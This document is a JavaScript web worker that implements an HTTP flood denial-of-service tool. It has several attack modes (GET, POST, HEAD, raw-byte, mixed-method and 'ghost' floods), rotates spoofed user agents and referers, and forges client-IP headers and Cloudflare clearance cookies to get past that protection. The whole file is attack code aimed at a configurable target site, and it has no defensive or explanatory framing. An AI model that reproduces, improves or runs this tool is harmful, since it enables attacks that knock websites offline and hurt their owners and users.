let ACTIVE = false;
let STATS = { sent: 0, failed: 0 };
let PROXIES = [];
let TARGET = "";
let CF = null;

const UA_POOL = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
];

const REF_POOL = [
  "https://www.google.com/",
  "https://www.bing.com/",
  "https://www.facebook.com/",
  "https://twitter.com/",
  "https://www.reddit.com/",
  "https://www.youtube.com/"
];

function rand(a, b) { return Math.floor(Math.random() * (b - a + 1)) + a; }

function rstr(n) {
  const c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let s = "";
  for (let i = 0; i < n; i++) s += c.charAt(rand(0, 61));
  return s;
}

function rip() { 
  return rand(1, 223) + "." + rand(0, 255) + "." + rand(0, 255) + "." + rand(1, 254); 
}

function buildHeaders(cfBypass) {
  const h = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": REF_POOL[rand(0, REF_POOL.length - 1)],
    "Connection": "keep-alive",
    "Cache-Control": "no-cache, no-store, must-revalidate",
    "Pragma": "no-cache",
    "DNT": "1",
    "sec-ch-ua": "Not.A/Brand;v=99, Chromium;v=125",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "Windows",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": UA_POOL[rand(0, UA_POOL.length - 1)]
  };
  if (cfBypass && CF) {
    h["CF-Connecting-IP"] = rip();
    h["X-Forwarded-For"] = rip();
    h["X-Real-IP"] = rip();
    h["X-Forwarded-Proto"] = "https";
    h["CF-Visitor"] = '{"scheme":"https"}';
    h["CF-RAY"] = CF.ray || rstr(16);
    h["Cookie"] = "__cfduid=" + rstr(32) + "; cf_clearance=" + (CF.cf_clearance || rstr(40));
  } else {
    h["Cookie"] = "session=" + rstr(32);
  }
  return h;
}

function fire(url, method, body, cf) {
  try {
    fetch(url, {
      method: method || "GET",
      mode: "no-cors",
      credentials: "omit",
      cache: "no-store",
      headers: buildHeaders(cf),
      body: body || undefined
    }).catch(function() {});
    STATS.sent++;
  } catch (e) {
    STATS.failed++;
  }
}

function httpFlood() { 
  while (ACTIVE) { 
    fire("https://" + TARGET + "/?" + rstr(8) + "=" + rand(100000, 999999), "GET", null, false); 
  } 
}

function cfFlood() { 
  const paths = ["/", "/api/", "/search", "/login", "/admin"];
  while (ACTIVE) { 
    fire("https://" + TARGET + paths[rand(0, 4)] + "?_=" + rstr(6), "GET", null, true); 
  } 
}

function postFlood() { 
  while (ACTIVE) { 
    const b = new URLSearchParams();
    for (let i = 0; i < 10; i++) b.append(rstr(6), rstr(20));
    fire("https://" + TARGET + "/", "POST", b, false); 
  } 
}

function rawFlood() { 
  while (ACTIVE) { 
    const arr = new Uint8Array(rand(256, 2048));
    for (let i = 0; i < arr.length; i++) arr[i] = rand(0, 255);
    fire("https://" + TARGET + "/", "POST", arr, false); 
  } 
}

function headFlood() { 
  while (ACTIVE) { 
    fire("https://" + TARGET + "/?" + rstr(8) + "=" + rand(100000, 999999), "HEAD", null, false); 
  } 
}

function mixFlood() { 
  const methods = ["GET", "POST", "HEAD", "OPTIONS", "PUT", "DELETE"];
  while (ACTIVE) { 
    fire("https://" + TARGET + "/", methods[rand(0, 5)], null, rand(0, 1) === 1); 
  } 
}

function ghostFlood() { 
  const ghosts = ["GET / HTTP/1.1", "POST / HTTP/1.1", "HEAD / HTTP/1.1"];
  while (ACTIVE) { 
    fire("https://" + TARGET + "/", "POST", ghosts[rand(0, 2)], false); 
  } 
}

const MAP = {
  "http-flood": httpFlood, "get-flood": httpFlood, "post-flood": postFlood,
  "raw-flood": rawFlood, "head-flood": headFlood, "mix-flood": mixFlood,
  "cf-bypass": cfFlood, "cf-uam": cfFlood, "http-ghost": ghostFlood,
  "bypass-ttl": httpFlood, "http-bypass": httpFlood, "cf-cookie": cfFlood
};

self.onmessage = function(e) {
  const d = e.data;
  if (d.cmd === "init") {
    PROXIES = d.config.proxies || [];
    TARGET = d.config.target || "target-site.com";
    CF = d.config.cfTokens || null;
    self.postMessage({ type: "ready", proxies: PROXIES.length });
  }
  if (d.cmd === "start") {
    ACTIVE = true;
    const methods = d.config.methods || ["http-flood"];
    for (let m = 0; m < methods.length; m++) {
      const fn = MAP[methods[m]] || httpFlood;
      for (let i = 0; i < (d.config.threads || 50); i++) fn();
    }
    setInterval(function() { 
      self.postMessage({ type: "stats", sent: STATS.sent, failed: STATS.failed }); 
    }, 500);
  }
  if (d.cmd === "stop") {
    ACTIVE = false;
    self.postMessage({ type: "stopped", final: STATS });
  }
};
